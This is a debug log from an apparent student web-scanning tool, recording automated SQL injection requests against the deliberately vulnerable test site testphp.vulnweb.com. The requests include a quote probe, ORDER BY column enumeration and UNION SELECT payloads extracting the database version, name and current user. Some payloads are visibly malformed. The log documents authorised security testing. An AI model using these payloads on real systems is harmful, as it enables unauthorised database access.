INFO [2022-05-09 15:13:10,098] root 25572 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-09 15:13:10,103] urllib3.connectionpool 25572 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:13:11,294] urllib3.connectionpool 25572 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /guestbook.php HTTP/1.1" 200 None]
INFO [2022-05-09 15:14:53,684] root 25976 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-09 15:14:53,690] urllib3.connectionpool 25976 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:14:54,389] urllib3.connectionpool 25976 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /guestbook.php HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:14:54,392] urllib3.connectionpool 25976 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:14:55,049] urllib3.connectionpool 25976 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /guestbook.php HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:05,015] urllib3.connectionpool 25976 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:05,699] urllib3.connectionpool 25976 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "POST /guestbook.php HTTP/1.1" 200 None]
INFO [2022-05-09 15:15:47,028] root 26067 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-09 15:15:47,289] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:47,951] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:47,956] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:48,628] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "HEAD /listproducts.php?cat=1' HTTP/1.1" 200 0]
DEBUG [2022-05-09 15:15:48,634] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:49,307] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "POST /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:49,314] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:49,987] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+1 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:49,993] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:50,655] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+2 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:50,662] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:51,347] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+3 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:51,353] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:52,011] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+4 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:52,017] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:52,700] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+5 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:52,707] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:53,425] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+6 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:53,432] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:54,138] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+7 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:54,146] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:54,842] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+8 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:54,848] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:55,551] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+9 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:55,557] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:56,213] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+10 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:56,231] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:56,887] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+11 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:56,893] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:57,566] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+12 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:57,574] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:58,254] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208,%209,%20version()0,%20version()version() HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:58,261] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:58,945] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:58,952] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:15:59,625] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:15:59,633] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:00,306] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:00,314] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:01,034] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:01,051] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:01,752] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:01,760] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:02,428] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:02,436] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:03,121] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version(),%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:03,130] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:03,835] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%208,%20version(),%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:03,842] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:04,521] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%208,%209,%20version(),%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:04,530] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:05,186] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%208,%209,%2010,%20version() HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:05,194] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:05,847] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208,%209,%20database()0,%20database()database() HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:05,874] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:06,546] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+1,%20database(),%203,%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:06,583] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:07,287] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208,%209,%20(SELECT+CURRENT_USER)0,%20(SELECT+CURRENT_USER)(SELECT+CURRENT_USER) HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:16:07,308] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:16:08,001] urllib3.connectionpool 26067 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
INFO [2022-05-09 15:20:09,479] root 26183 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-09 15:20:09,737] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:10,412] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:10,418] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:11,113] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "HEAD /listproducts.php?cat=1' HTTP/1.1" 200 0]
DEBUG [2022-05-09 15:20:11,116] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:11,781] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "POST /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:11,795] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:12,473] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+1 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:12,480] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:13,161] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+2 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:13,170] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:13,868] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+3 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:13,877] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:14,565] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+4 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:14,572] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:15,310] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+5 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:15,317] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:16,012] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+6 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:16,020] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:16,666] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+7 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:16,685] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:17,363] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+8 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:17,369] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:18,067] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+9 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:18,077] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:18,768] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+10 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:18,775] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:19,434] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+11 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:19,440] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:20,124] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+ORDER+BY+12 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:20,132] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:20,846] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208,%209,%20version()0,%20version()version() HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:20,853] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:21,550] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:21,557] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:22,225] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:22,235] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:22,954] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:22,961] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:23,683] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:23,691] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:24,417] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:24,428] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:25,120] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:25,129] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:25,790] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version(),%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:25,797] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:26,473] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%208,%20version(),%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:26,482] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:27,182] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%208,%209,%20version(),%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:27,189] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:27,860] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%208,%209,%2010,%20version() HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:27,870] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:28,555] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208,%209,%20database()0,%20database()database() HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:28,582] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:29,255] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+1,%20database(),%203,%204,%205,%206,%207,%208,%209,%2010,%2011 HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:29,298] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:20:29,986] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208,%209,%20(SELECT+CURRENT_USER)0,%20(SELECT+CURRENT_USER)(SELECT+CURRENT_USER) HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:20:30,024] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
